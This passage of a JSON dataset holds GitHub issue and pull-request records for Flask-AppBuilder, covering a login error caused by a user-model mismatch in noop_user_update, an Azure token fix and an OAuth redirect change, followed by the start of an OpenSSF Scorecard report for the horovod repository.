                "body": "Not sure exactly when the issue began, but it might have been when upgrading from `Flask-AppBuilder==3.1.1` to `Flask-AppBuilder==3.4.4`\r\n\r\n\r\n### Environment\r\n\r\nFlask-Appbuilder version: 3.4.4\r\n\r\npip freeze output:\r\n\r\nalembic==1.5.2\r\napispec==3.3.2\r\nattrs==20.3.0\r\nBabel==2.9.0\r\nblack==22.1.0\r\nblinker==1.4\r\ncachetools==4.2.1\r\ncertifi==2020.12.5\r\ncffi==1.14.4\r\nchardet==4.0.0\r\nclick==8.0.4\r\ncolorama==0.4.4\r\ndefusedxml==0.6.0\r\ndnspython==2.1.0\r\nemail-validator==1.1.2\r\nFlask==1.1.2\r\nFlask-AppBuilder==3.4.4\r\nFlask-Babel==1.0.0\r\nFlask-JWT-Extended==3.25.0\r\nFlask-Login==0.4.1\r\nFlask-Mail==0.9.1\r\nflask-marshmallow==0.11.0\r\nFlask-Migrate==2.6.0\r\nFlask-Misaka==1.0.0\r\nFlask-OpenID==1.2.5\r\nFlask-SQLAlchemy==2.4.4\r\nFlask-WTF==0.14.3\r\ngoogle-api-core==1.25.0\r\ngoogle-api-python-client==1.12.8\r\ngoogle-auth==1.24.0\r\ngoogle-auth-httplib2==0.0.4\r\ngoogle-auth-oauthlib==0.4.2\r\ngoogleapis-common-protos==1.52.0\r\ngspread==3.6.0\r\nhttplib2==0.18.1\r\nidna==2.10\r\nimportlib-metadata==3.4.0\r\nitsdangerous==1.1.0\r\nJinja2==2.11.2\r\njsonschema==3.2.0\r\nMako==1.1.4\r\nMarkupSafe==1.1.1\r\nmarshmallow==3.10.0\r\nmarshmallow-enum==1.5.1\r\nmarshmallow-sqlalchemy==0.23.1\r\nmisaka==2.1.1\r\nmypy-extensions==0.4.3\r\noauth2client==4.1.3\r\noauthlib==3.1.0\r\npathspec==0.9.0\r\npkg_resources==0.0.0\r\nplatformdirs==2.5.1\r\nprison==0.2.1\r\nprotobuf==3.14.0\r\npyasn1==0.4.8\r\npyasn1-modules==0.2.8\r\npycparser==2.20\r\nPyJWT==1.7.1\r\npyrsistent==0.17.3\r\npython-dateutil==2.8.1\r\npython-editor==1.0.4\r\npython3-openid==3.2.0\r\npytz==2020.5\r\nPyYAML==5.4.1\r\nrequests==2.25.1\r\nrequests-oauthlib==1.3.0\r\nrsa==4.7\r\nsdfspu==0.2.1\r\nsheetfu==1.5.4\r\nsix==1.15.0\r\nSQLAlchemy==1.3.22\r\nSQLAlchemy-Utils==0.36.8\r\ntomli==2.0.1\r\ntyped-ast==1.5.2\r\ntyping_extensions==4.1.1\r\nuritemplate==3.0.1\r\nurllib3==1.26.2\r\nWerkzeug==1.0.1\r\nWTForms==2.3.3\r\nzipp==3.4.0\r\n\r\n\r\n### Describe the expected results\r\n\r\nExpected no errors on /login.\r\n\r\n### Describe the actual results\r\n\r\nI was checking for something else in the error.log on app in production, and instead found many error \r\nwith `raise exception\r\nsqlalchemy.exc.InvalidRequestError: Could not evaluate current criteria in Python: \"Can't evaluate criteria against alternate class <class 'app.sec_models.MyUser'>\". Specify 'fetch' or False for the synchronize_session execution option.\r\n`\r\n\r\nFrom the error.log:\r\n\r\n```pytb\r\n2022-03-24 21:30:43,564: Exception on /login/ [POST]\r\nTraceback (most recent call last):\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/persistence.py\", line 1938, in _do_pre_synchronize_evaluate\r\n    eval_condition = evaluator_compiler.process(*crit)\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/evaluator.py\", line 85, in process\r\n    return meth(clause)\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/evaluator.py\", line 181, in visit_binary\r\n    map(self.process, [clause.left, clause.right])\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/evaluator.py\", line 85, in process\r\n    return meth(clause)\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/evaluator.py\", line 107, in visit_column\r\n    % parentmapper.class_\r\nsqlalchemy.orm.evaluator.UnevaluatableError: Can't evaluate criteria against alternate class <class 'app.sec_models.MyUser'>\r\n**NO MATCH**\r\nThe above exception was the direct cause of the following exception:\r\n**NO MATCH**\r\nTraceback (most recent call last):\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask/app.py\", line 2447, in wsgi_app\r\n    response = self.full_dispatch_request()\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask/app.py\", line 1952, in full_dispatch_request\r\n    rv = self.handle_user_exception(e)\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask/app.py\", line 1821, in handle_user_exception\r\n    reraise(exc_type, exc_value, tb)\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask/_compat.py\", line 39, in reraise\r\n    raise value\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask/app.py\", line 1950, in full_dispatch_request\r\n    rv = self.dispatch_request()\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask/app.py\", line 1936, in dispatch_request\r\n    return self.view_functions[rule.endpoint](**req.view_args)\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask_appbuilder/security/views.py\", line 518, in login\r\n    form.username.data, form.password.data\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask_appbuilder/security/manager.py\", line 874, in auth_user_db\r\n    self.noop_user_update(first_user)\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/flask_appbuilder/security/sqla/manager.py\", line 247, in noop_user_update\r\n    self.get_session.execute(stmt)\r\n  File \"<string>\", line 2, in execute\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/session.py\", line 1646, in execute\r\n    _parent_execute_state is not None,\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/persistence.py\", line 1823, in orm_pre_session_exec\r\n    update_options,\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/orm/persistence.py\", line 1951, in _do_pre_synchronize_evaluate\r\n    from_=err,\r\n  File \"/home/client/envs/ppoc2022/lib/python3.7/site-packages/sqlalchemy/util/compat.py\", line 207, in raise_\r\n    raise exception\r\nsqlalchemy.exc.InvalidRequestError: Could not evaluate current criteria in Python: \"Can't evaluate criteria against alternate class <class 'app.sec_models.MyUser'>\". Specify 'fetch' or False for the synchronize_session execution option.\r\n\r\n```\r\n\r\n### From app/sec_models.py\r\n```python\r\n\"\"\"Models needed by the security manager\r\n\"\"\"\r\n\r\nimport datetime\r\n\r\nfrom flask_appbuilder import Model\r\nfrom flask_appbuilder.models.mixins import AuditMixin\r\nfrom flask_appbuilder.security.sqla.models import User\r\nfrom sqlalchemy import Column, Integer, ForeignKey, String, Table, DateTime, Text\r\nfrom sqlalchemy.orm import relationship\r\n\r\nfrom .util_models import AuditMixinExtra\r\n\r\n\r\nclass MyUser(User):\r\n    __tablename__ = 'ab_user'\r\n    extra = Column(String(256))\r\n\r\n    def __repr__(self):\r\n        return str(self.username)\r\n\r\n\r\nassoc_user_emailaddr = Table(\r\n    'user_emailaddr',\r\n    Model.metadata,\r\n    Column('id', Integer, primary_key=True),\r\n    Column('user_id', Integer, ForeignKey('ab_user.id')),\r\n    Column('email_addr', Integer, ForeignKey('email_address_record.id')),\r\n)\r\n\r\n\r\nclass EmailAddressRecord(AuditMixinExtra, Model):\r\n    \"\"\"An EmailAddress might be seen before a user is registered with it;\r\n\r\n    this object has backref from other objects, such as GoogleFormResponse,\r\n    which include an email address.\r\n\r\n    If a user then does register, it can link to other objects via this record.\r\n    \"\"\"\r\n\r\n    id = Column(Integer, primary_key=True)\r\n    email = Column(String(64), unique=True, nullable=False)\r\n    user = relationship(\r\n        'MyUser',\r\n        secondary=assoc_user_emailaddr,\r\n        backref='email_address_record'\r\n    )\r\n\r\n    def __repr__(self):\r\n        return '@:{}'.format(self.id)\r\n\r\n```\r\n\r\n### Steps to reproduce\r\n\r\nI am still investigating the situation, but posting this incomplete report now with the hopes that someone might have enough info in the above to suggest what might be the issue.  \r\n\r\nI intend to to post again when I have have reproduced the error.\r\n\r\nThanks for reading.\r\n",
                "comments": [
                    {
                        "body": "Interesting, seems like it comes from: https://github.com/dpgaspar/Flask-AppBuilder/blob/e2d3f017bfeb30e863a25fa63de4699db20bc8d4/flask_appbuilder/security/sqla/manager.py#L241\r\n\r\nplease update if you reach any conclusion\r\n",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2022-03-25T16:17:47Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1822#issuecomment-1079185066"
                    },
                    {
                        "body": "Thanks, Daniel.  Yes, I will look at how my MyUser class, or other custom security manager stuff might be interacting with that no-op function...\r\n\r\n### further detail\r\n\r\n#### Login values tested to reproduce the error\r\n\r\n- non-valid username: ERROR as described above, user get a server error 500 page\r\n- valid username, valid password: OK, no error\r\n- valid username, wrong password: OK, no error, FAB gives flash message as expected\r\n\r\n\r\n#### from config.py\r\n```python\r\n# ...\r\nSQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'appdata.db') \r\n# ...\r\nAUTH_TYPE = AUTH_DB\r\n# ...\r\nAUTH_USER_REGISTRATION = True\r\n```\r\n\r\n### could not (and then could) reproduce in dev\r\n\r\nOn my current main dev machine FAB is flashing the \"Invalid login. Please try again.\" message as expected, with this in the log:\r\n\r\n```pylog\r\n2022-03-25 19:39:12,308:INFO:flask_appbuilder.security.manager:Login Failed for user: null\r\n2022-03-25 19:39:12,339:INFO:werkzeug:192.168.1.239 - - [25/Mar/2022 19:39:12] \"POST /login/ HTTP/1.1\" 302 -\r\n2022-03-25 19:39:12,606:INFO:werkzeug:192.168.1.239 - - [25/Mar/2022 19:39:12] \"GET /login/ HTTP/1.1\" 200 -\r\n```\r\n\r\n(edit to update...) On a new computer being set up, a windows 10 box, I was able to reproduce the `Can't evaluate criteria against alternate class <class 'app.sec_models.MyUser'>` error by trying to login with an invalid username.    So far I have only compared `python --version` on the three loactions, but given the values I don't think that's the issue... will look more into it.\r\n\r\nPython versions:\r\n- Dev : 3.7.3\r\n- Production : 3.7.0\r\n- New Dev : 3.7.9\r\n\r\n",
                        "user": "soundmaking",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-03-25T19:21:31Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1822#issuecomment-1079362973"
                    },
                    {
                        "body": "This seems to have fixed it: letting the noop update function use `self.user_model` instead of `User` on this line\r\n\r\nhttps://github.com/dpgaspar/Flask-AppBuilder/blob/e2d3f017bfeb30e863a25fa63de4699db20bc8d4/flask_appbuilder/security/sqla/manager.py#L243\r\n\r\n\r\nAdded in my app/sec.py:\r\n\r\n```python\r\nfrom sqlalchemy import update\r\n# . . . \r\n\r\nclass MySecurityManager(SecurityManager):\r\n    # . . .\r\n    # minor change to SecurityManager.noop_user_update\r\n    def noop_user_update(self, user: \"User\") -> None:\r\n        stmt = (\r\n            update(self.user_model)  # was update(User)\r\n                .where(self.user_model.id == user.id)\r\n                .values(login_count=user.login_count)\r\n        )\r\n        self.get_session.execute(stmt)\r\n        self.get_session.commit()\r\n```\r\n\r\n",
                        "user": "soundmaking",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-03T14:40:38Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1822#issuecomment-1086883138"
                    },
                    {
                        "body": "Right makes perfect sense @soundmaking, I'll make a PR for the fix",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2022-04-22T09:13:39Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1822#issuecomment-1106224996"
                    },
                    {
                        "body": "@soundmaking ok merged the fix, will be out on the next release 4.0.1 (should be soon 1/2 weeks)",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2022-04-22T09:46:22Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1822#issuecomment-1106275367"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1642",
                "title": "fix: add warning text to roles when AUTH_ROLES_SYNC_AT_LOGIN",
                "labels": [
                    "security:crud"
                ],
                "user": "dpgaspar",
                "issue_author_association": "OWNER",
                "number": 1642,
                "id": 894581293,
                "state": "closed",
                "project_created_at": "2021-05-18T16:46:54Z",
                "closed_at": "2021-05-24T08:35:16Z",
                "body": "### Description\r\n\r\nAdds a warning message when creating or editing a user and `AUTH_ROLES_SYNC_AT_LOGIN` is enabled.\r\n\r\n<img width=\"1182\" alt=\"Screenshot 2021-05-20 at 09 51 29\" src=\"https://user-images.githubusercontent.com/4025227/118949312-fe4e5200-b950-11eb-9e11-ab65065cd51d.png\">\r\n\r\ncc: @cccs-rc @thesuperzapper \r\n\r\n### ADDITIONAL INFORMATION\r\n- [X] Has associated issue: #1627\r\n- [X] Is CRUD MVC related.\r\n- [ ] Is Auth, RBAC security related.\r\n- [ ] Changes the security db schema.\r\n- [ ] Introduces new feature\r\n- [ ] Removes existing feature\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/dpgaspar/Flask-AppBuilder/pulls/1642",
                    "merged_at": "2021-05-24T08:35:15Z"
                }
            },
            {
                "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640",
                "title": "fix: Issue #1638 - replaced id_token by access_token for azure",
                "labels": [
                    "stale",
                    "security:auth"
                ],
                "user": "melazarus",
                "issue_author_association": "NONE",
                "number": 1640,
                "id": 887105926,
                "state": "closed",
                "project_created_at": "2021-05-11T12:22:00Z",
                "closed_at": "2022-04-16T05:25:04Z",
                "body": "### Description\r\n\r\nThis fixes the issue descript in #1638 where the upn can't be located in id_token but actually is present in access_token.\r\n\r\n### ADDITIONAL INFORMATION\r\n- [x] Has associated issue: 1638\r\n- [x] Is Auth, RBAC security related.\r\n",
                "comments": [
                    {
                        "body": "@melazarus can you clarify if something has changed on the azure end, and why we would have previously used `id_token`?\r\n\r\nIf possibly can you link me the relevant Azure docs?",
                        "user": "thesuperzapper",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-05-17T10:00:06Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640#issuecomment-842192363"
                    },
                    {
                        "body": "@thesuperzapper, as far as I can see, but I'm not an expert, this did not change in azure.\r\nWhen I look at the documentation for [id_token](https://docs.microsoft.com/en-us/azure/active-directory/develop/id-tokens) and [access_token](https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens) on the ms docs pages I see that the UPN is included in the payload of the access_token but it is not in the claims of the id_token.",
                        "user": "melazarus",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-05-25T14:38:11Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640#issuecomment-847925636"
                    },
                    {
                        "body": "@melazarus @thesuperzapper \r\n\r\nYes, this makes some sense according to docs, has a reference this new feature was added here: https://github.com/dpgaspar/Flask-AppBuilder/pull/615\r\n\r\nLooking at the docs:\r\nThe unique fields `email` and `username` use `upn` and `oid` respectively. Where in fact `upn` is not present on the `id_token` but `email` is, so it probably makes more sense to use this field (config would need to change to include the email option claim), and a fall back to construct a unique email based on the username has a best effort and to preserve uniqueness.\r\n\r\nOn the other hand `given_name` and `family_name` belong to the `access_token` claims. \r\n\r\nNot an expert on Azure AD, but `id_token` is more compliant to OpenID OAuth and `access_token` seems more Azure proprietary is this a right assumption @melazarus ?\r\n",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2021-06-11T10:35:06Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640#issuecomment-859485342"
                    },
                    {
                        "body": "This issue has been automatically marked as stale because it has not had recent activity. It will be closed in 7 days if no further activity occurs.  Feel free to reopen it if it's still relevant to you. Thank you \n",
                        "user": "stale[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-03-30T05:51:21Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640#issuecomment-1082648767"
                    },
                    {
                        "body": "Any details on why this PR was closed? `upn` issue still exists",
                        "user": "haripraghash",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-14T08:57:16Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640#issuecomment-1184183385"
                    },
                    {
                        "body": "> Any details on why this PR was closed? `upn` issue still exists\r\n\r\n@haripraghash this was closed by a stalebot (not a human) due to inactivity.\r\nCan you explain what you mean by `upn` issue?",
                        "user": "thesuperzapper",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-14T22:29:37Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640#issuecomment-1184955669"
                    },
                    {
                        "body": "@thesuperzapper Thank you for that.\r\n\r\nI am referring to the issue #1638 . In that, it mentions that `upn` is not present in `id_token` but in `access_token`",
                        "user": "haripraghash",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-15T11:58:44Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1640#issuecomment-1185474473"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/dpgaspar/Flask-AppBuilder/pulls/1640",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1618",
                "title": "refactor: OAuth - redirect direct to provider if just one provider exists",
                "labels": [
                    "security:crud"
                ],
                "user": "hyunjong-lee",
                "issue_author_association": "CONTRIBUTOR",
                "number": 1618,
                "id": 865792162,
                "state": "closed",
                "project_created_at": "2021-04-23T06:32:34Z",
                "closed_at": "2021-06-11T10:55:33Z",
                "body": "<!--- Thank you for contributing to Flask-Appbuilder. -->\r\n<!--- This repo uses a PR lint bot (https://github.com/apps/prlint), make sure to prefix your PR title with one of: -->\r\n<!--- build|chore|ci|docs|feat|fix|perf|refactor|style|test|other -->\r\n\r\n### Description\r\n\r\nIn AuthOAuthView, redirection is always needed.\r\nIf just one provider exists, users can go to the provider auth page directly without selection.\r\nThis PR refactor the above situation. 😄\r\n\r\n<!--- Describe the change below, including rationale and design decisions -->\r\n\r\n### ADDITIONAL INFORMATION\r\n<!--- Check any relevant boxes with \"x\" -->\r\n<!--- HINT: Include \"Fixes #nnn\" if you are fixing an existing issue -->\r\n- [ ] Has associated issue:\r\n- [ ] Is CRUD MVC related.\r\n- [x] Is Auth, RBAC security related.\r\n- [ ] Changes the security db schema.\r\n- [ ] Introduces new feature\r\n- [ ] Removes existing feature\r\n",
                "comments": [
                    {
                        "body": "@hyunjong-lee manually tested it, thank you for the improvement!\r\n",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2021-06-11T10:55:23Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1618#issuecomment-859497675"
                    },
                    {
                        "body": "Hi.\r\nWhy this PR is missing in version  >= 3.4.0 ???\r\nplease add to version 3.4.0+ ",
                        "user": "melnikovmaksimv",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-02-07T11:43:49Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1618#issuecomment-1031375865"
                    },
                    {
                        "body": "Hi, \r\nThis issue persists in superset version 3.1.1. Is anyone facing this issue? Do you have any workaround for this?",
                        "user": "manikandantk88",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-03-17T18:14:31Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1618#issuecomment-2002562521"
                    },
                    {
                        "body": "Hi,\r\n\r\nI also face the same issue. Any idea for a workaround ? We are using 3.1.0 and also 3.1.1",
                        "user": "oldchurch12",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-04-03T11:49:45Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/pull/1618#issuecomment-2034369111"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/dpgaspar/Flask-AppBuilder/pulls/1618",
                    "merged_at": "2021-06-11T10:55:33Z"
                }
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 6,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "horovod/horovod",
        "project_url": "https://github.com/horovod/horovod",
        "SSF": {
            "date": "2024-10-30T01:12:46+07:00",
            "repo": {
                "name": "github.com/horovod/horovod",
                "commit": "3a31d933a13c7c885b8a673f4172b17914ad334d"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'u028'",
                        "Warn: branch protection not enabled for branch 'hotfix-0243'",
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 1,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 1,
                    "reason": "4 out of 30 merged PRs checked by a CI test -- score normalized to 1",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 8,
                    "reason": "Found 24/30 approved changesets -- score normalized to 8",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: carbonrobotics contributor org/company found, databricks contributor org/company found, determined-ai contributor org/company found, publiclab contributor org/company found, linkedin contributor org/company found, ML-KA contributor org/company found, deepl se contributor org/company found, aws contributor org/company found, intel corp. contributor org/company found, chronosphere contributor org/company found, DeepLcom contributor org/company found, nvidia contributor org/company found, apache contributor org/company found, uber contributor org/company found, horovod contributor org/company found, anyscale contributor org/company found, amazon web services contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 17 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": [
                        "Warn: script injection with untrusted input ' github.event.pull_request.head.ref || github.ref ': .github/workflows/ci.yaml:133"
                    ],
                    "score": 0,
                    "reason": "dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "1 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/ci.yaml:4709"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1079",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1088",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1097",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1106",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1115",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1124",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1160",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1169",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1178",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1187",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1196",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1205",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1214",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1223",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1232",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1241",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1250",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1259",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1268",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1277",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:1286",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1295",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1304",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1313",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1322",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1331",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1340",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1376",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1385",
